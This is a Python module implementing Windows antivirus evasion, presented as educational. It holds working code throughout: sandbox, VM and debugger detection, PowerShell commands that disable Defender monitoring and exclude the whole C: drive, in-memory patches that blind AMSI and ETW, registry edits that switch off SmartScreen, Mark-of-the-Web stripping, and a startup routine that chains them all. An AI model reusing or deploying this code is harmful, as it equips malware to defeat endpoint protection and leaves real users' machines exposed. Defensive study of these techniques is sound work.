"""
Anti-Virus Evasion Module
Educational implementation of AV evasion techniques
For cybersecurity education and authorized testing only
"""

import os
import sys
import time
import ctypes
import hashlib
import base64
from pathlib import Path


class AVEvasion:
    """
    Implements various AV evasion techniques
    Educational purpose: Demonstrates how malware evades detection
    """

    @staticmethod
    def check_sandbox():
        """
        Detect if running in sandbox/VM environment
        Returns: True if likely sandbox, False otherwise
        """
        indicators = 0

        # Check for common VM/sandbox artifacts
        if sys.platform == 'win32':
            try:
                # Check for VM-related files
                vm_files = [
                    r'C:\windows\System32\Drivers\Vmmouse.sys',
                    r'C:\windows\System32\Drivers\vmhgfs.sys',
                    r'C:\windows\System32\Drivers\VBoxMouse.sys',
                    r'C:\windows\System32\Drivers\VBoxGuest.sys',
                    r'C:\windows\System32\vboxdisp.dll',
                    r'C:\windows\System32\vboxhook.dll',
                ]

                for file in vm_files:
                    if os.path.exists(file):
                        indicators += 1

                # Check RAM (VMs usually have limited RAM)
                import psutil
                ram_gb = psutil.virtual_memory().total / (1024**3)
                if ram_gb < 4:  # Less than 4GB is suspicious
                    indicators += 1

                # Check number of processors
                if psutil.cpu_count() < 2:
                    indicators += 1

            except:
                pass

        return indicators >= 2

    @staticmethod
    def sleep_evasion(seconds=60):
        """
        Sleep to evade sandboxes (they have limited analysis time)
        Most sandboxes analyze for 30-60 seconds only
        """
        if AVEvasion.check_sandbox():
            # If we detect sandbox, sleep longer to timeout the analysis
            time.sleep(seconds)
            return True
        return False

    @staticmethod
    def check_debugger():
        """
        Check if a debugger is attached
        Returns: True if debugger detected
        """
        if sys.platform == 'win32':
            try:
                # Use Windows API to check for debugger
                return ctypes.windll.kernel32.IsDebuggerPresent() != 0
            except:
                pass
        return False

    @staticmethod
    def check_mouse_movement():
        """
        Check if mouse has moved (real user vs automated analysis)
        Sandboxes often don't simulate mouse movement
        """
        if sys.platform == 'win32':
            try:
                import win32api
                # Get initial position
                pos1 = win32api.GetCursorPos()
                time.sleep(5)
                # Get position after 5 seconds
                pos2 = win32api.GetCursorPos()

                # If mouse hasn't moved, might be sandbox
                return pos1 != pos2
            except:
                pass
        # Assume real user if we can't check
        return True

    @staticmethod
    def string_obfuscate(text):
        """
        Obfuscate strings to avoid signature detection
        """
        # Simple XOR obfuscation
        key = 0x42
        return ''.join(chr(ord(c) ^ key) for c in text)

    @staticmethod
    def string_deobfuscate(obfuscated):
        """
        Deobfuscate strings
        """
        key = 0x42
        return ''.join(chr(ord(c) ^ key) for c in obfuscated)

    @staticmethod
    def check_av_processes():
        """
        Check if AV processes are running
        Returns: List of detected AV processes
        """
        av_processes = []

        if sys.platform == 'win32':
            try:
                import psutil

                # Common AV process names
                av_names = [
                    'MsMpEng.exe',  # Windows Defender
                    'avp.exe',      # Kaspersky
                    'avgnt.exe',    # Avira
                    'avgsvc.exe',   # AVG
                    'bdagent.exe',  # Bitdefender
                    'egui.exe',     # ESET
                    'ekrn.exe',     # ESET
                    'msascuil.exe', # Windows Defender UI
                    'MpCmdRun.exe', # Windows Defender CMD
                ]

                for proc in psutil.process_iter(['name']):
                    try:
                        if proc.info['name'] in av_names:
                            av_processes.append(proc.info['name'])
                    except:
                        pass

            except:
                pass

        return av_processes

    @staticmethod
    def disable_defender():
        """
        EDUCATIONAL ONLY - Shows how malware tries to disable Defender
        NOTE: This will likely fail without admin rights
        Returns: Success status
        """
        if sys.platform != 'win32':
            return False

        try:
            # Try to disable Windows Defender Real-Time Protection
            # This requires admin rights and will likely be blocked
            commands = [
                'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
                'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
                'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
                'powershell -Command "Add-MpPreference -ExclusionPath \\"C:\\\\\\""',
            ]

            for cmd in commands:
                try:
                    os.system(cmd + ' 2>nul')
                except:
                    pass

            return True
        except:
            return False

    @staticmethod
    def add_defender_exclusion(path):
        """
        Try to add exclusion to Windows Defender
        Requires admin rights
        """
        if sys.platform != 'win32':
            return False

        try:
            cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \\"{path}\\"" 2>nul'
            result = os.system(cmd)
            return result == 0
        except:
            return False

    @staticmethod
    def is_admin():
        """
        Check if running with administrator privileges
        """
        if sys.platform == 'win32':
            try:
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            except:
                return False
        else:
            return os.geteuid() == 0

    @staticmethod
    def polymorphic_copy(source_path, target_path):
        """
        Create a polymorphic copy (changes file hash)
        Adds random data to change signature without breaking functionality
        """
        try:
            # Read original file
            with open(source_path, 'rb') as f:
                content = f.read()

            # Add random bytes at the end (in a way that doesn't affect execution)
            import random
            random_data = bytes([random.randint(0, 255) for _ in range(1024)])

            # For PE files, we can add data after the end without breaking them
            # Write modified file
            with open(target_path, 'wb') as f:
                f.write(content)
                f.write(random_data)

            return True
        except:
            return False

    @staticmethod
    def check_internet():
        """
        Check if internet is available
        Some sandboxes don't have internet
        """
        try:
            import socket
            socket.create_connection(("8.8.8.8", 53), timeout=3)
            return True
        except:
            return False

    @staticmethod
    def comprehensive_check():
        """
        Comprehensive environment check
        Returns: (is_safe, reason)
        """
        # Check for debugger
        if AVEvasion.check_debugger():
            return False, "Debugger detected"

        # Check for sandbox
        if AVEvasion.check_sandbox():
            return False, "Sandbox detected"

        # Check internet (optional, can be too aggressive)
        # if not AVEvasion.check_internet():
        #     return False, "No internet connection"

        # All checks passed
        return True, "Environment appears safe"

    @staticmethod
    def patch_amsi():
        """
        Disable AMSI (Antimalware Scan Interface) scanning
        AMSI scans scripts and in-memory code execution
        Educational: Shows how malware bypasses AMSI
        """
        if sys.platform != 'win32':
            return False

        try:
            import ctypes
            from ctypes import wintypes

            # Load amsi.dll
            amsi = ctypes.windll.LoadLibrary("amsi.dll")

            # Get address of AmsiScanBuffer
            AmsiScanBuffer = amsi.AmsiScanBuffer

            # Protection flags
            PAGE_EXECUTE_READWRITE = 0x40
            kernel32 = ctypes.windll.kernel32

            # Patch bytes to disable AMSI (returns always clean)
            # Original: Test function
            # Patched: Returns 0 (clean)
            patch = b"\xB8\x57\x00\x07\x80\xC3"  # mov eax, 0x80070057; ret

            # Get function address
            addr = ctypes.cast(AmsiScanBuffer, ctypes.c_void_p).value

            # Change memory protection
            old_protect = wintypes.DWORD()
            if kernel32.VirtualProtect(addr, len(patch), PAGE_EXECUTE_READWRITE, ctypes.byref(old_protect)):
                # Write patch
                ctypes.memmove(addr, patch, len(patch))
                # Restore protection
                kernel32.VirtualProtect(addr, len(patch), old_protect.value, ctypes.byref(old_protect))
                return True

        except Exception as e:
            pass

        return False

    @staticmethod
    def patch_etw():
        """
        Disable ETW (Event Tracing for Windows)
        ETW is used by Defender for behavioral analysis
        """
        if sys.platform != 'win32':
            return False

        try:
            import ctypes
            from ctypes import wintypes

            # Load ntdll.dll
            ntdll = ctypes.windll.LoadLibrary("ntdll.dll")

            # Get EtwEventWrite function
            EtwEventWrite = ntdll.EtwEventWrite

            # Protection flags
            PAGE_EXECUTE_READWRITE = 0x40
            kernel32 = ctypes.windll.kernel32

            # Patch to return immediately (ret)
            patch = b"\xC3"  # ret instruction

            # Get function address
            addr = ctypes.cast(EtwEventWrite, ctypes.c_void_p).value

            # Change memory protection
            old_protect = wintypes.DWORD()
            if kernel32.VirtualProtect(addr, len(patch), PAGE_EXECUTE_READWRITE, ctypes.byref(old_protect)):
                # Write patch
                ctypes.memmove(addr, patch, len(patch))
                # Restore protection
                kernel32.VirtualProtect(addr, len(patch), old_protect.value, ctypes.byref(old_protect))
                return True

        except:
            pass

        return False

    @staticmethod
    def delay_execution(min_seconds=120):
        """
        Delayed execution to evade sandbox time limits
        Uses multiple techniques to ensure real delay
        """
        if AVEvasion.check_sandbox():
            # Multiple delay techniques to fool sandbox time acceleration
            start = time.time()

            # Method 1: Sleep
            time.sleep(min_seconds / 3)

            # Method 2: Busy wait with checks
            while (time.time() - start) < (2 * min_seconds / 3):
                # Do some meaningless operations
                _ = sum([i**2 for i in range(100)])
                time.sleep(0.1)

            # Method 3: File I/O delay (harder to accelerate)
            temp_file = Path(os.getenv('TEMP', '/tmp')) / f".tmp_{os.getpid()}"
            try:
                for _ in range(10):
                    with open(temp_file, 'w') as f:
                        f.write('x' * 10000)
                    time.sleep(1)
                    os.remove(temp_file)
            except:
                pass

            return True
        return False

    @staticmethod
    def check_process_count():
        """
        Check number of running processes
        Sandboxes typically have fewer processes
        """
        if sys.platform == 'win32':
            try:
                import psutil
                process_count = len(list(psutil.process_iter()))
                # Real systems typically have 50+ processes
                return process_count < 50
            except:
                pass
        return False

    @staticmethod
    def check_disk_size():
        """
        Check disk size - VMs often have small virtual disks
        """
        if sys.platform == 'win32':
            try:
                import psutil
                disk = psutil.disk_usage('C:\\')
                # Less than 60GB is suspicious
                return disk.total < (60 * 1024 * 1024 * 1024)
            except:
                pass
        return False

    @staticmethod
    def check_recent_files():
        """
        Check for recent user activity
        Sandboxes typically have no recent files
        """
        if sys.platform == 'win32':
            try:
                recent_path = Path(os.getenv('APPDATA')) / 'Microsoft' / 'Windows' / 'Recent'
                if recent_path.exists():
                    # Count recent files
                    recent_files = list(recent_path.glob('*.lnk'))
                    # Real users have many recent files
                    return len(recent_files) < 10
            except:
                pass
        return False

    @staticmethod
    def advanced_sandbox_detection():
        """
        Advanced sandbox detection combining multiple checks
        Returns: (is_sandbox, confidence_score)
        """
        score = 0
        checks = []

        # Run all checks
        if AVEvasion.check_sandbox():
            score += 3
            checks.append("VM artifacts")

        if AVEvasion.check_process_count():
            score += 2
            checks.append("Low process count")

        if AVEvasion.check_disk_size():
            score += 2
            checks.append("Small disk")

        if AVEvasion.check_recent_files():
            score += 1
            checks.append("No recent activity")

        # Score interpretation:
        # 0-1: Likely real system
        # 2-4: Possibly sandbox
        # 5+: Highly likely sandbox

        is_sandbox = score >= 3
        return is_sandbox, score, checks

    @staticmethod
    def disable_smartscreen():
        """
        Try to disable Windows SmartScreen
        Requires admin privileges
        Educational: Shows how malware disables SmartScreen
        """
        if sys.platform != 'win32':
            return False

        try:
            import subprocess

            # Registry keys to disable SmartScreen
            commands = [
                # Disable SmartScreen for apps and files
                r'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f',

                # Disable SmartScreen in Edge
                r'reg add "HKCU\Software\Microsoft\Edge\SmartScreenEnabled" /t REG_DWORD /d 0 /f',

                # Disable SmartScreen in IE
                r'reg add "HKCU\Software\Microsoft\Internet Explorer\PhishingFilter" /v EnabledV9 /t REG_DWORD /d 0 /f',

                # Disable for Store apps
                r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost" /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f',
            ]

            for cmd in commands:
                try:
                    subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
                except:
                    pass

            return True
        except:
            return False

    @staticmethod
    def mark_file_as_trusted(file_path):
        """
        Mark file as downloaded from trusted zone
        Removes Mark of the Web (MOTW) which triggers SmartScreen
        """
        if sys.platform != 'win32':
            return False

        try:
            # Remove the Zone.Identifier alternate data stream
            # This is what Windows uses to mark files from internet
            ads_path = f"{file_path}:Zone.Identifier"

            try:
                os.remove(ads_path)
            except:
                pass

            # Alternative method using PowerShell
            try:
                import subprocess
                cmd = f'powershell -Command "Unblock-File -Path \\"{file_path}\\"" 2>nul'
                subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
            except:
                pass

            return True
        except:
            return False

    @staticmethod
    def run_all_evasions():
        """
        Run all evasion techniques at startup
        Returns: True if safe to continue, False if should exit
        """
        # Check for debugger first
        if AVEvasion.check_debugger():
            sys.exit(0)

        # Advanced sandbox detection
        is_sandbox, score, checks = AVEvasion.advanced_sandbox_detection()

        if is_sandbox:
            # Use adaptive delay based on confidence
            delay_time = min(60 + (score * 20), 180)  # 60-180 seconds
            AVEvasion.delay_execution(delay_time)

        # Patch AMSI and ETW
        AVEvasion.patch_amsi()
        AVEvasion.patch_etw()

        # Try to add exclusions and disable SmartScreen if admin
        if AVEvasion.is_admin():
            current_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
            AVEvasion.add_defender_exclusion(os.path.dirname(current_path))
            AVEvasion.disable_smartscreen()
            AVEvasion.mark_file_as_trusted(current_path)

        return True
